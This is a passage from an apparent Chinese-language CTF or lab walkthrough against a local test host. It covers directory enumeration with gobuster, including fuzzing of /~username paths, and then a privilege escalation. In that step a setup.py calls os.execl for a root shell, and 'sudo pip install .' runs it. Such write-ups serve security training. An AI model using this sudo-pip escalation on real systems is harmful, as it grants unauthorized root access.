                  1.2 目录扫描#

                  dirb http://192.168.174.132，结果混乱，因此转用gobuster 第一个命令快速摸底，common字典约4600行； 第二个命令慢，directory-list-2.3-medium.txt字典约220000行； 第三个命令最慢，还叠加上各种后缀进行扫描。

                  1gobuster dir -u http://192.168.174.132 -w /usr/share/wordlists/dirb/common.txt
2gobuster dir -u http://192.168.174.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
3gobuster dir -u http://192.168.174.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt,php,bak,html

                  然而实则都不行，因为上面是URL/字典词这样的形式，我们需要的是/~字典词语这样的目录扫描

                  1gobuster fuzz -u http://192.168.174.132/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
2gobuster fuzz -u http://192.168.174.132/~FUZZ -w /usr/share/wordlists/dirb/common.txt

                  发现可以用root身份执行pip命令，那么用pip的root权限安装一个shell的程序

                  先创建一个伪装称python包的目录，接着安装当前目录里的python包 而echo语句中，

                  • os.execl理解：os.execl()是用新程序替换当前进程，即pip进行→变成root shell
                  • 参数理解：'/bin/sh'要执行的程序，'sh'程序名，'-c'执行后面的命令， 'sh <$(tty) >$(tty) 2>$(tty)'重定向输入输出
                  • 长参数理解：sh <$(tty) >$(tty) 2>$(tty)是让shell正确绑定当前终端，<$(tty)把输入连接到当前终端，>$(tty)把输出连接到当前终端，2>$(tty)把错误输出连接到当前终端
                  1mkdir upfine
2cd upfine
3echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > setup.py
4sudo pip install .
